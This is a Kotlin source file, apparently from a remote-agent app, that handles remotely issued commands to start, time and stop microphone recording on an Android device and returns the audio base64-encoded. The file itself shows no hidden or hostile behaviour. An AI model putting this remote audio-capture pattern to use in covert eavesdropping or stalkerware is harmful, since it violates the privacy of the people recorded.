package com.remoteagent.protocol.commands

import android.Manifest
import android.content.Context
import com.remoteagent.media.AudioCaptureHelper
import com.remoteagent.protocol.CommandResult
import com.remoteagent.protocol.DeviceCommand
import org.json.JSONObject
import java.util.Base64

/**
 * Microphone / audio recording commands (start, timed capture, stop).
 */
class MicCommands(private val context: Context) {

    fun start(command: DeviceCommand): CommandResult {
        if (!context.hasPermission(Manifest.permission.RECORD_AUDIO)) {
            return CommandResult.failed("PERMISSION_DENIED", "RECORD_AUDIO permission not granted")
        }
        val mode = command.getString("mode", "")
        var duration = command.getInt("duration", -1)
        return try {
            if ("start".equals(mode, ignoreCase = true) || duration == 0) {
                AudioCaptureHelper.startRecording(context)
                return CommandResult.success(
                    JSONObject().apply { put("recording", true) }.toString()
                )
            }
            if (duration < 0) {
                duration = 60
            }
            val audio = AudioCaptureHelper.recordOgg(context, duration)
            CommandResult.success(audio)
        } catch (e: Exception) {
            CommandResult.failed("Failed to record audio: ${e.message}")
        }
    }

    fun stop(command: DeviceCommand): CommandResult {
        return try {
            if (!AudioCaptureHelper.isRecording()) {
                return CommandResult.success(
                    JSONObject().apply {
                        put("stopped", true)
                        put("message", "No active recording")
                    }.toString()
                )
            }
            val audio = AudioCaptureHelper.stopRecording()
            CommandResult.success(
                JSONObject().apply {
                    put("stopped", true)
                    put("audio_base64", Base64.getEncoder().encodeToString(audio))
                }.toString()
            )
        } catch (e: Exception) {
            CommandResult.failed("Failed to stop microphone: ${e.message}")
        }
    }

    fun register(into: MutableMap<DeviceCommand.CommandType, CommandExecutor>) {
        into[DeviceCommand.CommandType.MIC_START] = CommandExecutor { start(it) }
        into[DeviceCommand.CommandType.MIC_STOP] = CommandExecutor { stop(it) }
    }
}
